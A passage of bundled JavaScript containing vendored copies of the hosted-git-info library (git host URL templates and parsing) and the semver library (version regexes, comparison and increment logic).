      filetemplate: ({ auth, user, project, committish, path }) => `https://${maybeJoin(auth, "@")}raw.githubusercontent.com/${user}/${project}/${maybeEncode(committish || "HEAD")}/${path}`,
      gittemplate: ({ auth, domain, user, project, committish }) => `git://${maybeJoin(auth, "@")}${domain}/${user}/${project}.git${maybeJoin("#", committish)}`,
      tarballtemplate: ({ domain, user, project, committish }) => `https://codeload.${domain}/${user}/${project}/tar.gz/${maybeEncode(committish || "HEAD")}`,
      extract: (url) => {
        let [, user, project, type, committish] = url.pathname.split("/", 5);
        if (type && type !== "tree") {
          return;
        }
        if (!type) {
          committish = url.hash.slice(1);
        }
        if (project && project.endsWith(".git")) {
          project = project.slice(0, -4);
        }
        if (!user || !project) {
          return;
        }
        return { user, project, committish };
      }
    };
    hosts.bitbucket = {
      protocols: ["git+ssh:", "git+https:", "ssh:", "https:"],
      domain: "bitbucket.org",
      treepath: "src",
      blobpath: "src",
      editpath: "?mode=edit",
      edittemplate: ({ domain, user, project, committish, treepath, path, editpath }) => `https://${domain}/${user}/${project}${maybeJoin("/", treepath, "/", maybeEncode(committish || "HEAD"), "/", path, editpath)}`,
      tarballtemplate: ({ domain, user, project, committish }) => `https://${domain}/${user}/${project}/get/${maybeEncode(committish || "HEAD")}.tar.gz`,
      extract: (url) => {
        let [, user, project, aux] = url.pathname.split("/", 4);
        if (["get"].includes(aux)) {
          return;
        }
        if (project && project.endsWith(".git")) {
          project = project.slice(0, -4);
        }
        if (!user || !project) {
          return;
        }
        return { user, project, committish: url.hash.slice(1) };
      }
    };
    hosts.gitlab = {
      protocols: ["git+ssh:", "git+https:", "ssh:", "https:"],
      domain: "gitlab.com",
      treepath: "tree",
      blobpath: "tree",
      editpath: "-/edit",
      tarballtemplate: ({ domain, user, project, committish }) => `https://${domain}/api/v4/projects/${maybeEncode(user + "/" + project)}/repository/archive.tar.gz?sha=${maybeEncode(committish || "HEAD")}`,
      extract: (url) => {
        const path = url.pathname.slice(1);
        if (path.includes("/-/") || path.includes("/archive.tar.gz")) {
          return;
        }
        const segments = path.split("/");
        let project = segments.pop();
        if (project.endsWith(".git")) {
          project = project.slice(0, -4);
        }
        const user = segments.join("/");
        if (!user || !project) {
          return;
        }
        return { user, project, committish: url.hash.slice(1) };
      }
    };
    hosts.gist = {
      protocols: ["git:", "git+ssh:", "git+https:", "ssh:", "https:"],
      domain: "gist.github.com",
      editpath: "edit",
      sshtemplate: ({ domain, project, committish }) => `git@${domain}:${project}.git${maybeJoin("#", committish)}`,
      sshurltemplate: ({ domain, project, committish }) => `git+ssh://git@${domain}/${project}.git${maybeJoin("#", committish)}`,
      edittemplate: ({ domain, user, project, committish, editpath }) => `https://${domain}/${user}/${project}${maybeJoin("/", maybeEncode(committish))}/${editpath}`,
      browsetemplate: ({ domain, project, committish }) => `https://${domain}/${project}${maybeJoin("/", maybeEncode(committish))}`,
      browsetreetemplate: ({ domain, project, committish, path, hashformat }) => `https://${domain}/${project}${maybeJoin("/", maybeEncode(committish))}${maybeJoin("#", hashformat(path))}`,
      browseblobtemplate: ({ domain, project, committish, path, hashformat }) => `https://${domain}/${project}${maybeJoin("/", maybeEncode(committish))}${maybeJoin("#", hashformat(path))}`,
      docstemplate: ({ domain, project, committish }) => `https://${domain}/${project}${maybeJoin("/", maybeEncode(committish))}`,
      httpstemplate: ({ domain, project, committish }) => `git+https://${domain}/${project}.git${maybeJoin("#", committish)}`,
      filetemplate: ({ user, project, committish, path }) => `https://gist.githubusercontent.com/${user}/${project}/raw${maybeJoin("/", maybeEncode(committish))}/${path}`,
      shortcuttemplate: ({ type, project, committish }) => `${type}:${project}${maybeJoin("#", committish)}`,
      pathtemplate: ({ project, committish }) => `${project}${maybeJoin("#", committish)}`,
      bugstemplate: ({ domain, project }) => `https://${domain}/${project}`,
      gittemplate: ({ domain, project, committish }) => `git://${domain}/${project}.git${maybeJoin("#", committish)}`,
      tarballtemplate: ({ project, committish }) => `https://codeload.github.com/gist/${project}/tar.gz/${maybeEncode(committish || "HEAD")}`,
      extract: (url) => {
        let [, user, project, aux] = url.pathname.split("/", 4);
        if (aux === "raw") {
          return;
        }
        if (!project) {
          if (!user) {
            return;
          }
          project = user;
          user = null;
        }
        if (project.endsWith(".git")) {
          project = project.slice(0, -4);
        }
        return { user, project, committish: url.hash.slice(1) };
      },
      hashformat: function(fragment) {
        return fragment && "file-" + formatHashFragment(fragment);
      }
    };
    hosts.sourcehut = {
      protocols: ["git+ssh:", "https:"],
      domain: "git.sr.ht",
      treepath: "tree",
      blobpath: "tree",
      filetemplate: ({ domain, user, project, committish, path }) => `https://${domain}/${user}/${project}/blob/${maybeEncode(committish) || "HEAD"}/${path}`,
      httpstemplate: ({ domain, user, project, committish }) => `https://${domain}/${user}/${project}${maybeJoin("#", committish)}`,
      tarballtemplate: ({ domain, user, project, committish }) => `https://${domain}/${user}/${project}/archive/${maybeEncode(committish) || "HEAD"}.tar.gz`,
      bugstemplate: () => null,
      extract: (url) => {
        let [, user, project, aux] = url.pathname.split("/", 4);
        if (["archive"].includes(aux)) {
          return;
        }
        if (project && project.endsWith(".git")) {
          project = project.slice(0, -4);
        }
        if (!user || !project) {
          return;
        }
        return { user, project, committish: url.hash.slice(1) };
      }
    };
    for (const [name, host] of Object.entries(hosts)) {
      hosts[name] = Object.assign({}, defaults, host);
    }
    module2.exports = hosts;
  }
});

// node_modules/.pnpm/hosted-git-info@10.1.1/node_modules/hosted-git-info/lib/parse-url.js
var require_parse_url = __commonJS({
  "node_modules/.pnpm/hosted-git-info@10.1.1/node_modules/hosted-git-info/lib/parse-url.js"(exports2, module2) {
    var lastIndexOfBefore = (str, char, beforeChar) => {
      const startPosition = str.indexOf(beforeChar);
      return str.lastIndexOf(char, startPosition > -1 ? startPosition : Infinity);
    };
    var safeUrl = (u) => {
      try {
        return new URL(u);
      } catch {
      }
    };
    var correctProtocol = (arg, protocols) => {
      const firstColon = arg.indexOf(":");
      const proto = arg.slice(0, firstColon + 1);
      if (Object.prototype.hasOwnProperty.call(protocols, proto)) {
        return arg;
      }
      if (arg.substr(firstColon, 3) === "://") {
        return arg;
      }
      const firstAt = arg.indexOf("@");
      if (firstAt > -1) {
        if (firstAt > firstColon) {
          return `git+ssh://${arg}`;
        } else {
          return arg;
        }
      }
      return `${arg.slice(0, firstColon + 1)}//${arg.slice(firstColon + 1)}`;
    };
    var correctUrl = (giturl) => {
      const firstAt = lastIndexOfBefore(giturl, "@", "#");
      const lastColonBeforeHash = lastIndexOfBefore(giturl, ":", "#");
      if (lastColonBeforeHash > firstAt) {
        giturl = giturl.slice(0, lastColonBeforeHash) + "/" + giturl.slice(lastColonBeforeHash + 1);
      }
      if (lastIndexOfBefore(giturl, ":", "#") === -1 && giturl.indexOf("//") === -1) {
        giturl = `git+ssh://${giturl}`;
      }
      return giturl;
    };
    module2.exports = (giturl, protocols) => {
      const withProtocol = protocols ? correctProtocol(giturl, protocols) : giturl;
      return safeUrl(withProtocol) || safeUrl(correctUrl(withProtocol));
    };
  }
});

// node_modules/.pnpm/hosted-git-info@10.1.1/node_modules/hosted-git-info/lib/from-url.js
var require_from_url = __commonJS({
  "node_modules/.pnpm/hosted-git-info@10.1.1/node_modules/hosted-git-info/lib/from-url.js"(exports2, module2) {
    "use strict";
    var parseUrl = require_parse_url();
    var isGitHubShorthand = (arg) => {
      const firstHash = arg.indexOf("#");
      const firstSlash = arg.indexOf("/");
      const secondSlash = arg.indexOf("/", firstSlash + 1);
      const firstColon = arg.indexOf(":");
      const firstSpace = /\s/.exec(arg);
      const firstAt = arg.indexOf("@");
      const spaceOnlyAfterHash = !firstSpace || firstHash > -1 && firstSpace.index > firstHash;
      const atOnlyAfterHash = firstAt === -1 || firstHash > -1 && firstAt > firstHash;
      const colonOnlyAfterHash = firstColon === -1 || firstHash > -1 && firstColon > firstHash;
      const secondSlashOnlyAfterHash = secondSlash === -1 || firstHash > -1 && secondSlash > firstHash;
      const hasSlash = firstSlash > 0;
      const doesNotEndWithSlash = firstHash > -1 ? arg[firstHash - 1] !== "/" : !arg.endsWith("/");
      const doesNotStartWithDot = !arg.startsWith(".");
      return spaceOnlyAfterHash && hasSlash && doesNotEndWithSlash && doesNotStartWithDot && atOnlyAfterHash && colonOnlyAfterHash && secondSlashOnlyAfterHash;
    };
    module2.exports = (giturl, opts, { gitHosts, protocols }) => {
      if (!giturl) {
        return;
      }
      const correctedUrl = isGitHubShorthand(giturl) ? `github:${giturl}` : giturl;
      const parsed = parseUrl(correctedUrl, protocols);
      if (!parsed) {
        return;
      }
      const gitHostShortcut = gitHosts.byShortcut[parsed.protocol];
      const gitHostDomain = gitHosts.byDomain[parsed.hostname.startsWith("www.") ? parsed.hostname.slice(4) : parsed.hostname];
      const gitHostName = gitHostShortcut || gitHostDomain;
      if (!gitHostName) {
        return;
      }
      const gitHostInfo = gitHosts[gitHostShortcut || gitHostDomain];
      let auth = null;
      if (protocols[parsed.protocol]?.auth && (parsed.username || parsed.password)) {
        auth = `${parsed.username}${parsed.password ? ":" + parsed.password : ""}`;
      }
      let committish = null;
      let user = null;
      let project = null;
      let defaultRepresentation = null;
      try {
        if (gitHostShortcut) {
          let pathname = parsed.pathname.startsWith("/") ? parsed.pathname.slice(1) : parsed.pathname;
          const firstAt = pathname.indexOf("@");
          if (firstAt > -1) {
            pathname = pathname.slice(firstAt + 1);
          }
          const lastSlash = pathname.lastIndexOf("/");
          if (lastSlash > -1) {
            user = decodeURIComponent(pathname.slice(0, lastSlash));
            if (!user) {
              user = null;
            }
            project = decodeURIComponent(pathname.slice(lastSlash + 1));
          } else {
            project = decodeURIComponent(pathname);
          }
          if (project.endsWith(".git")) {
            project = project.slice(0, -4);
          }
          if (parsed.hash) {
            committish = decodeURIComponent(parsed.hash.slice(1));
          }
          defaultRepresentation = "shortcut";
        } else {
          if (!gitHostInfo.protocols.includes(parsed.protocol)) {
            return;
          }
          const segments = gitHostInfo.extract(parsed);
          if (!segments) {
            return;
          }
          user = segments.user && decodeURIComponent(segments.user);
          project = decodeURIComponent(segments.project);
          committish = decodeURIComponent(segments.committish);
          defaultRepresentation = protocols[parsed.protocol]?.name || parsed.protocol.slice(0, -1);
        }
      } catch (err) {
        if (err instanceof URIError) {
          return;
        } else {
          throw err;
        }
      }
      return [gitHostName, user, auth, project, committish, defaultRepresentation, opts];
    };
  }
});

// node_modules/.pnpm/hosted-git-info@10.1.1/node_modules/hosted-git-info/lib/index.js
var require_lib = __commonJS({
  "node_modules/.pnpm/hosted-git-info@10.1.1/node_modules/hosted-git-info/lib/index.js"(exports2, module2) {
    "use strict";
    var { LRUCache } = require_index_min();
    var hosts = require_hosts();
    var fromUrl = require_from_url();
    var parseUrl = require_parse_url();
    var cache = new LRUCache({ max: 1e3 });
    function unknownHostedUrl(url) {
      try {
        const {
          protocol,
          hostname,
          pathname
        } = new URL(url);
        if (!hostname) {
          return null;
        }
        const proto = /(?:git\+)http:$/.test(protocol) ? "http:" : "https:";
        const path = pathname.replace(/\.git$/, "");
        return `${proto}//${hostname}${path}`;
      } catch {
        return null;
      }
    }
    var GitHost = class _GitHost {
      constructor(type, user, auth, project, committish, defaultRepresentation, opts = {}) {
        Object.assign(this, _GitHost.#gitHosts[type], {
          type,
          user,
          auth,
          project,
          committish,
          default: defaultRepresentation,
          opts
        });
      }
      static #gitHosts = { byShortcut: {}, byDomain: {} };
      static #protocols = {
        "git+ssh:": { name: "sshurl" },
        "ssh:": { name: "sshurl" },
        "git+https:": { name: "https", auth: true },
        "git:": { auth: true },
        "http:": { auth: true },
        "https:": { auth: true },
        "git+http:": { auth: true }
      };
      static addHost(name, host) {
        _GitHost.#gitHosts[name] = host;
        _GitHost.#gitHosts.byDomain[host.domain] = name;
        _GitHost.#gitHosts.byShortcut[`${name}:`] = name;
        _GitHost.#protocols[`${name}:`] = { name };
      }
      static fromUrl(giturl, opts) {
        if (typeof giturl !== "string") {
          return;
        }
        const key = giturl + JSON.stringify(opts || {});
        if (!cache.has(key)) {
          const hostArgs = fromUrl(giturl, opts, {
            gitHosts: _GitHost.#gitHosts,
            protocols: _GitHost.#protocols
          });
          cache.set(key, hostArgs ? new _GitHost(...hostArgs) : void 0);
        }
        return cache.get(key);
      }
      static fromManifest(manifest, opts = {}) {
        if (!manifest || typeof manifest !== "object") {
          return;
        }
        const r = manifest.repository;
        const rurl = r && (typeof r === "string" ? r : typeof r === "object" && typeof r.url === "string" ? r.url : null);
        if (!rurl) {
          throw new Error("no repository");
        }
        const info = rurl && _GitHost.fromUrl(rurl.replace(/^git\+/, ""), opts) || null;
        if (info) {
          return info;
        }
        const unk = unknownHostedUrl(rurl);
        return _GitHost.fromUrl(unk, opts) || unk;
      }
      static parseUrl(url) {
        return parseUrl(url);
      }
      #fill(template, opts) {
        if (typeof template !== "function") {
          return null;
        }
        const options = { ...this, ...this.opts, ...opts };
        if (!options.path) {
          options.path = "";
        }
        if (options.path.startsWith("/")) {
          options.path = options.path.slice(1);
        }
        if (options.noCommittish) {
          options.committish = null;
        }
        const result = template(options);
        return options.noGitPlus && result.startsWith("git+") ? result.slice(4) : result;
      }
      hash() {
        return this.committish ? `#${this.committish}` : "";
      }
      ssh(opts) {
        return this.#fill(this.sshtemplate, opts);
      }
      sshurl(opts) {
        return this.#fill(this.sshurltemplate, opts);
      }
      browse(path, ...args) {
        if (typeof path !== "string") {
          return this.#fill(this.browsetemplate, path);
        }
        if (typeof args[0] !== "string") {
          return this.#fill(this.browsetreetemplate, { ...args[0], path });
        }
        return this.#fill(this.browsetreetemplate, { ...args[1], fragment: args[0], path });
      }
      // If the path is known to be a file, then browseFile should be used. For some hosts
      // the url is the same as browse, but for others like GitHub a file can use both `/tree/`
      // and `/blob/` in the path. When using a default committish of `HEAD` then the `/tree/`
      // path will redirect to a specific commit. Using the `/blob/` path avoids this and
      // does not redirect to a different commit.
      browseFile(path, ...args) {
        if (typeof args[0] !== "string") {
          return this.#fill(this.browseblobtemplate, { ...args[0], path });
        }
        return this.#fill(this.browseblobtemplate, { ...args[1], fragment: args[0], path });
      }
      docs(opts) {
        return this.#fill(this.docstemplate, opts);
      }
      bugs(opts) {
        return this.#fill(this.bugstemplate, opts);
      }
      https(opts) {
        return this.#fill(this.httpstemplate, opts);
      }
      git(opts) {
        return this.#fill(this.gittemplate, opts);
      }
      shortcut(opts) {
        return this.#fill(this.shortcuttemplate, opts);
      }
      path(opts) {
        return this.#fill(this.pathtemplate, opts);
      }
      tarball(opts) {
        return this.#fill(this.tarballtemplate, { ...opts, noCommittish: false });
      }
      file(path, opts) {
        return this.#fill(this.filetemplate, { ...opts, path });
      }
      edit(path, opts) {
        return this.#fill(this.edittemplate, { ...opts, path });
      }
      getDefaultRepresentation() {
        return this.default;
      }
      toString(opts) {
        if (this.default && typeof this[this.default] === "function") {
          return this[this.default](opts);
        }
        return this.sshurl(opts);
      }
    };
    for (const [name, host] of Object.entries(hosts)) {
      GitHost.addHost(name, host);
    }
    module2.exports = GitHost;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/internal/constants.js
var require_constants = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/internal/constants.js"(exports2, module2) {
    "use strict";
    var SEMVER_SPEC_VERSION = "2.0.0";
    var MAX_LENGTH = 256;
    var MAX_SAFE_INTEGER = Number.MAX_SAFE_INTEGER || /* istanbul ignore next */
    9007199254740991;
    var MAX_SAFE_COMPONENT_LENGTH = 16;
    var MAX_SAFE_BUILD_LENGTH = MAX_LENGTH - 6;
    var RELEASE_TYPES = [
      "major",
      "premajor",
      "minor",
      "preminor",
      "patch",
      "prepatch",
      "prerelease"
    ];
    module2.exports = {
      MAX_LENGTH,
      MAX_SAFE_COMPONENT_LENGTH,
      MAX_SAFE_BUILD_LENGTH,
      MAX_SAFE_INTEGER,
      RELEASE_TYPES,
      SEMVER_SPEC_VERSION,
      FLAG_INCLUDE_PRERELEASE: 1,
      FLAG_LOOSE: 2
    };
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/internal/debug.js
var require_debug = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/internal/debug.js"(exports2, module2) {
    "use strict";
    var debug = typeof process === "object" && process.env && process.env.NODE_DEBUG && /\bsemver\b/i.test(process.env.NODE_DEBUG) ? (...args) => console.error("SEMVER", ...args) : () => {
    };
    module2.exports = debug;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/internal/re.js
var require_re = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/internal/re.js"(exports2, module2) {
    "use strict";
    var {
      MAX_SAFE_COMPONENT_LENGTH,
      MAX_SAFE_BUILD_LENGTH,
      MAX_LENGTH
    } = require_constants();
    var debug = require_debug();
    exports2 = module2.exports = {};
    var re = exports2.re = [];
    var safeRe = exports2.safeRe = [];
    var src = exports2.src = [];
    var safeSrc = exports2.safeSrc = [];
    var t = exports2.t = {};
    var R = 0;
    var LETTERDASHNUMBER = "[a-zA-Z0-9-]";
    var safeRegexReplacements = [
      ["\\s", 1],
      ["\\d", MAX_LENGTH],
      [LETTERDASHNUMBER, MAX_SAFE_BUILD_LENGTH]
    ];
    var makeSafeRegex = (value) => {
      for (const [token, max] of safeRegexReplacements) {
        value = value.split(`${token}*`).join(`${token}{0,${max}}`).split(`${token}+`).join(`${token}{1,${max}}`);
      }
      return value;
    };
    var createToken = (name, value, isGlobal) => {
      const safe = makeSafeRegex(value);
      const index = R++;
      debug(name, index, value);
      t[name] = index;
      src[index] = value;
      safeSrc[index] = safe;
      re[index] = new RegExp(value, isGlobal ? "g" : void 0);
      safeRe[index] = new RegExp(safe, isGlobal ? "g" : void 0);
    };
    createToken("NUMERICIDENTIFIER", "0|[1-9]\\d*");
    createToken("NUMERICIDENTIFIERLOOSE", "\\d+");
    createToken("NONNUMERICIDENTIFIER", `\\d*[a-zA-Z-]${LETTERDASHNUMBER}*`);
    createToken("MAINVERSION", `(${src[t.NUMERICIDENTIFIER]})\\.(${src[t.NUMERICIDENTIFIER]})\\.(${src[t.NUMERICIDENTIFIER]})`);
    createToken("MAINVERSIONLOOSE", `(${src[t.NUMERICIDENTIFIERLOOSE]})\\.(${src[t.NUMERICIDENTIFIERLOOSE]})\\.(${src[t.NUMERICIDENTIFIERLOOSE]})`);
    createToken("PRERELEASEIDENTIFIER", `(?:${src[t.NONNUMERICIDENTIFIER]}|${src[t.NUMERICIDENTIFIER]})`);
    createToken("PRERELEASEIDENTIFIERLOOSE", `(?:${src[t.NONNUMERICIDENTIFIER]}|${src[t.NUMERICIDENTIFIERLOOSE]})`);
    createToken("PRERELEASE", `(?:-(${src[t.PRERELEASEIDENTIFIER]}(?:\\.${src[t.PRERELEASEIDENTIFIER]})*))`);
    createToken("PRERELEASELOOSE", `(?:-?(${src[t.PRERELEASEIDENTIFIERLOOSE]}(?:\\.${src[t.PRERELEASEIDENTIFIERLOOSE]})*))`);
    createToken("BUILDIDENTIFIER", `${LETTERDASHNUMBER}+`);
    createToken("BUILD", `(?:\\+(${src[t.BUILDIDENTIFIER]}(?:\\.${src[t.BUILDIDENTIFIER]})*))`);
    createToken("FULLPLAIN", `v?${src[t.MAINVERSION]}${src[t.PRERELEASE]}?${src[t.BUILD]}?`);
    createToken("FULL", `^${src[t.FULLPLAIN]}$`);
    createToken("LOOSEPLAIN", `[v=\\s]*${src[t.MAINVERSIONLOOSE]}${src[t.PRERELEASELOOSE]}?${src[t.BUILD]}?`);
    createToken("LOOSE", `^${src[t.LOOSEPLAIN]}$`);
    createToken("GTLT", "((?:<|>)?=?)");
    createToken("XRANGEIDENTIFIERLOOSE", `${src[t.NUMERICIDENTIFIERLOOSE]}|x|X|\\*`);
    createToken("XRANGEIDENTIFIER", `${src[t.NUMERICIDENTIFIER]}|x|X|\\*`);
    createToken("XRANGEPLAIN", `[v=\\s]*(${src[t.XRANGEIDENTIFIER]})(?:\\.(${src[t.XRANGEIDENTIFIER]})(?:\\.(${src[t.XRANGEIDENTIFIER]})(?:${src[t.PRERELEASE]})?${src[t.BUILD]}?)?)?`);
    createToken("XRANGEPLAINLOOSE", `[v=\\s]*(${src[t.XRANGEIDENTIFIERLOOSE]})(?:\\.(${src[t.XRANGEIDENTIFIERLOOSE]})(?:\\.(${src[t.XRANGEIDENTIFIERLOOSE]})(?:${src[t.PRERELEASELOOSE]})?${src[t.BUILD]}?)?)?`);
    createToken("XRANGE", `^${src[t.GTLT]}\\s*${src[t.XRANGEPLAIN]}$`);
    createToken("XRANGELOOSE", `^${src[t.GTLT]}\\s*${src[t.XRANGEPLAINLOOSE]}$`);
    createToken("COERCEPLAIN", `${"(^|[^\\d])(\\d{1,"}${MAX_SAFE_COMPONENT_LENGTH}})(?:\\.(\\d{1,${MAX_SAFE_COMPONENT_LENGTH}}))?(?:\\.(\\d{1,${MAX_SAFE_COMPONENT_LENGTH}}))?`);
    createToken("COERCE", `${src[t.COERCEPLAIN]}(?:$|[^\\d])`);
    createToken("COERCEFULL", src[t.COERCEPLAIN] + `(?:${src[t.PRERELEASE]})?(?:${src[t.BUILD]})?(?:$|[^\\d])`);
    createToken("COERCERTL", src[t.COERCE], true);
    createToken("COERCERTLFULL", src[t.COERCEFULL], true);
    createToken("LONETILDE", "(?:~>?)");
    createToken("TILDETRIM", `(\\s*)${src[t.LONETILDE]}\\s+`, true);
    exports2.tildeTrimReplace = "$1~";
    createToken("TILDE", `^${src[t.LONETILDE]}${src[t.XRANGEPLAIN]}$`);
    createToken("TILDELOOSE", `^${src[t.LONETILDE]}${src[t.XRANGEPLAINLOOSE]}$`);
    createToken("LONECARET", "(?:\\^)");
    createToken("CARETTRIM", `(\\s*)${src[t.LONECARET]}\\s+`, true);
    exports2.caretTrimReplace = "$1^";
    createToken("CARET", `^${src[t.LONECARET]}${src[t.XRANGEPLAIN]}$`);
    createToken("CARETLOOSE", `^${src[t.LONECARET]}${src[t.XRANGEPLAINLOOSE]}$`);
    createToken("COMPARATORLOOSE", `^${src[t.GTLT]}\\s*(${src[t.LOOSEPLAIN]})$|^$`);
    createToken("COMPARATOR", `^${src[t.GTLT]}\\s*(${src[t.FULLPLAIN]})$|^$`);
    createToken("COMPARATORTRIM", `(\\s*)${src[t.GTLT]}\\s*(${src[t.LOOSEPLAIN]}|${src[t.XRANGEPLAIN]})`, true);
    exports2.comparatorTrimReplace = "$1$2$3";
    createToken("HYPHENRANGE", `^\\s*(${src[t.XRANGEPLAIN]})\\s+-\\s+(${src[t.XRANGEPLAIN]})\\s*$`);
    createToken("HYPHENRANGELOOSE", `^\\s*(${src[t.XRANGEPLAINLOOSE]})\\s+-\\s+(${src[t.XRANGEPLAINLOOSE]})\\s*$`);
    createToken("STAR", "(<|>)?=?\\s*\\*");
    createToken("GTE0", "^\\s*>=\\s*0\\.0\\.0\\s*$");
    createToken("GTE0PRE", "^\\s*>=\\s*0\\.0\\.0-0\\s*$");
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/internal/parse-options.js
var require_parse_options = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/internal/parse-options.js"(exports2, module2) {
    "use strict";
    var looseOption = Object.freeze({ loose: true });
    var emptyOpts = Object.freeze({});
    var parseOptions = (options) => {
      if (!options) {
        return emptyOpts;
      }
      if (typeof options !== "object") {
        return looseOption;
      }
      return options;
    };
    module2.exports = parseOptions;
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/internal/identifiers.js
var require_identifiers = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/internal/identifiers.js"(exports2, module2) {
    "use strict";
    var numeric = /^[0-9]+$/;
    var compareIdentifiers = (a, b) => {
      if (typeof a === "number" && typeof b === "number") {
        return a === b ? 0 : a < b ? -1 : 1;
      }
      const anum = numeric.test(a);
      const bnum = numeric.test(b);
      if (anum && bnum) {
        a = +a;
        b = +b;
      }
      return a === b ? 0 : anum && !bnum ? -1 : bnum && !anum ? 1 : a < b ? -1 : 1;
    };
    var rcompareIdentifiers = (a, b) => compareIdentifiers(b, a);
    module2.exports = {
      compareIdentifiers,
      rcompareIdentifiers
    };
  }
});

// node_modules/.pnpm/semver@7.8.5/node_modules/semver/classes/semver.js
var require_semver = __commonJS({
  "node_modules/.pnpm/semver@7.8.5/node_modules/semver/classes/semver.js"(exports2, module2) {
    "use strict";
    var debug = require_debug();
    var { MAX_LENGTH, MAX_SAFE_INTEGER } = require_constants();
    var { safeRe: re, t } = require_re();
    var parseOptions = require_parse_options();
    var { compareIdentifiers } = require_identifiers();
    var isPrereleaseIdentifier = (prerelease, identifier) => {
      const identifiers = identifier.split(".");
      if (identifiers.length > prerelease.length) {
        return false;
      }
      for (let i = 0; i < identifiers.length; i++) {
        if (compareIdentifiers(prerelease[i], identifiers[i]) !== 0) {
          return false;
        }
      }
      return true;
    };
    var SemVer = class _SemVer {
      constructor(version, options) {
        options = parseOptions(options);
        if (version instanceof _SemVer) {
          if (version.loose === !!options.loose && version.includePrerelease === !!options.includePrerelease) {
            return version;
          } else {
            version = version.version;
          }
        } else if (typeof version !== "string") {
          throw new TypeError(`Invalid version. Must be a string. Got type "${typeof version}".`);
        }
        if (version.length > MAX_LENGTH) {
          throw new TypeError(
            `version is longer than ${MAX_LENGTH} characters`
          );
        }
        debug("SemVer", version, options);
        this.options = options;
        this.loose = !!options.loose;
        this.includePrerelease = !!options.includePrerelease;
        const m = version.trim().match(options.loose ? re[t.LOOSE] : re[t.FULL]);
        if (!m) {
          throw new TypeError(`Invalid Version: ${version}`);
        }
        this.raw = version;
        this.major = +m[1];
        this.minor = +m[2];
        this.patch = +m[3];
        if (this.major > MAX_SAFE_INTEGER || this.major < 0) {
          throw new TypeError("Invalid major version");
        }
        if (this.minor > MAX_SAFE_INTEGER || this.minor < 0) {
          throw new TypeError("Invalid minor version");
        }
        if (this.patch > MAX_SAFE_INTEGER || this.patch < 0) {
          throw new TypeError("Invalid patch version");
        }
        if (!m[4]) {
          this.prerelease = [];
        } else {
          this.prerelease = m[4].split(".").map((id) => {
            if (/^[0-9]+$/.test(id)) {
              const num = +id;
              if (num >= 0 && num < MAX_SAFE_INTEGER) {
                return num;
              }
            }
            return id;
          });
        }
        this.build = m[5] ? m[5].split(".") : [];
        this.format();
      }
      format() {
        this.version = `${this.major}.${this.minor}.${this.patch}`;
        if (this.prerelease.length) {
          this.version += `-${this.prerelease.join(".")}`;
        }
        return this.version;
      }
      toString() {
        return this.version;
      }
      compare(other) {
        debug("SemVer.compare", this.version, this.options, other);
        if (!(other instanceof _SemVer)) {
          if (typeof other === "string" && other === this.version) {
            return 0;
          }
          other = new _SemVer(other, this.options);
        }
        if (other.version === this.version) {
          return 0;
        }
        return this.compareMain(other) || this.comparePre(other);
      }
      compareMain(other) {
        if (!(other instanceof _SemVer)) {
          other = new _SemVer(other, this.options);
        }
        if (this.major < other.major) {
          return -1;
        }
        if (this.major > other.major) {
          return 1;
        }
        if (this.minor < other.minor) {
          return -1;
        }
        if (this.minor > other.minor) {
          return 1;
        }
        if (this.patch < other.patch) {
          return -1;
        }
        if (this.patch > other.patch) {
          return 1;
        }
        return 0;
      }
      comparePre(other) {
        if (!(other instanceof _SemVer)) {
          other = new _SemVer(other, this.options);
        }
        if (this.prerelease.length && !other.prerelease.length) {
          return -1;
        } else if (!this.prerelease.length && other.prerelease.length) {
          return 1;
        } else if (!this.prerelease.length && !other.prerelease.length) {
          return 0;
        }
        let i = 0;
        do {
          const a = this.prerelease[i];
          const b = other.prerelease[i];
          debug("prerelease compare", i, a, b);
          if (a === void 0 && b === void 0) {
            return 0;
          } else if (b === void 0) {
            return 1;
          } else if (a === void 0) {
            return -1;
          } else if (a === b) {
            continue;
          } else {
            return compareIdentifiers(a, b);
          }
        } while (++i);
      }
      compareBuild(other) {
        if (!(other instanceof _SemVer)) {
          other = new _SemVer(other, this.options);
        }
        let i = 0;
        do {
          const a = this.build[i];
          const b = other.build[i];
          debug("build compare", i, a, b);
          if (a === void 0 && b === void 0) {
            return 0;
          } else if (b === void 0) {
            return 1;
          } else if (a === void 0) {
            return -1;
          } else if (a === b) {
            continue;
          } else {
            return compareIdentifiers(a, b);
          }
        } while (++i);
      }
      // preminor will bump the version up to the next minor release, and immediately
      // down to pre-release. premajor and prepatch work the same way.
      inc(release, identifier, identifierBase) {
        if (release.startsWith("pre")) {
          if (!identifier && identifierBase === false) {
            throw new Error("invalid increment argument: identifier is empty");
          }
          if (identifier) {
            const match = `-${identifier}`.match(this.options.loose ? re[t.PRERELEASELOOSE] : re[t.PRERELEASE]);
            if (!match || match[1] !== identifier) {
              throw new Error(`invalid identifier: ${identifier}`);
            }
          }
        }
        switch (release) {
          case "premajor":
            this.prerelease.length = 0;
            this.patch = 0;
            this.minor = 0;
            this.major++;
            this.inc("pre", identifier, identifierBase);
            break;
          case "preminor":
            this.prerelease.length = 0;
            this.patch = 0;
            this.minor++;
            this.inc("pre", identifier, identifierBase);
            break;
          case "prepatch":
            this.prerelease.length = 0;
            this.inc("patch", identifier, identifierBase);
            this.inc("pre", identifier, identifierBase);
            break;
          // If the input is a non-prerelease version, this acts the same as
          // prepatch.
          case "prerelease":
            if (this.prerelease.length === 0) {
              this.inc("patch", identifier, identifierBase);
            }
            this.inc("pre", identifier, identifierBase);
            break;
          case "release":
            if (this.prerelease.length === 0) {
              throw new Error(`version ${this.raw} is not a prerelease`);
            }
            this.prerelease.length = 0;
            break;
          case "major":
            if (this.minor !== 0 || this.patch !== 0 || this.prerelease.length === 0) {
              this.major++;
            }
            this.minor = 0;
            this.patch = 0;
            this.prerelease = [];
            break;
          case "minor":
            if (this.patch !== 0 || this.prerelease.length === 0) {
              this.minor++;
            }
            this.patch = 0;
